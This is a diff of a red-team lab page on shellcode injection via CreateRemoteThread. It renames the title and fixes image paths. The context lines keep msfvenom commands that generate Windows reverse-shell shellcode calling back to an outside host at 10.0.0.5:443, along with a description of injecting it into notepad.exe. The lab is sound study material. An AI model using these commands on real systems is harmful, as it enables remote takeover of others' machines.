@@ -1,4 +1,4 @@
-# T1055: Process Injection
+# CreateRemoteThread Shellcode Injection
 
 This lab explores some classic ways of injecting shellcode into a process memory and executing it.
 
@@ -12,7 +12,7 @@ Generating shellcode for a reverse shell:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
 ```
 
-![](../.gitbook/assets/inject-shellcode.png)
+![](../../.gitbook/assets/inject-shellcode.png)
 
 C++ code to invoke the shellcode:
 
@@ -72,17 +72,17 @@ int main()
 
 Before compiling, let's have a look at the binary in a disassembler - just to get a rough idea of how our C++ code gets translated into machine code for x64:
 
-![](../.gitbook/assets/inject-ida.png)
+![](../../.gitbook/assets/inject-ida.png)
 
 For a x32 binary, the shellcode \(msfvenom -p windows/shell\_reverse\_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d\) is located in main thread's stack:
 
-![](../.gitbook/assets/inject-shellcode-location.png)
+![](../../.gitbook/assets/inject-shellcode-location.png)
 
 Back to the x64 bit shellcode - compiling and executing the binary gives us the anticipated reverse shell:
 
-![](../.gitbook/assets/inject-process.png)
+![](../../.gitbook/assets/inject-process.png)
 
-![](../.gitbook/assets/inject-reverse-shell.png)
+![](../../.gitbook/assets/inject-reverse-shell.png)
 
 ## Executing Shellcode in Remote Process
 
@@ -148,15 +148,15 @@ int main()
 
 The above code will inject the shellcode into a notepad.exe process with PID 5428. Below shows notepad has not initiated any TCP connections yet:
 
-![](../.gitbook/assets/inject-notepad-not-injected.png)
+![](../../.gitbook/assets/inject-notepad-not-injected.png)
 
 Once the code is compiled and executed, monitoring the API calls taking place on the system, it can be seen that notepad is doing something it should not ever - spawning a cmd.exe and initiating a TCP connection:
 
-![](../.gitbook/assets/inject-api-monitoring.png)
+![](../../.gitbook/assets/inject-api-monitoring.png)
 
 Checking the notepad again, the results are different this time:
 
-![](../.gitbook/assets/inject-notepad-injected.png)
+![](../../.gitbook/assets/inject-notepad-injected.png)
 
 {% embed data="{\"url\":\"https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess\",\"type\":\"link\",\"title\":\"OpenProcess function\",\"description\":\"Opens an existing local process object.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://docs.microsoft.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://docs.microsoft.com/\_themes/docs.theme/master/en-us/\_themes/images/microsoft-header.png\",\"width\":128,\"height\":128,\"aspectRatio\":1}}" %}
 
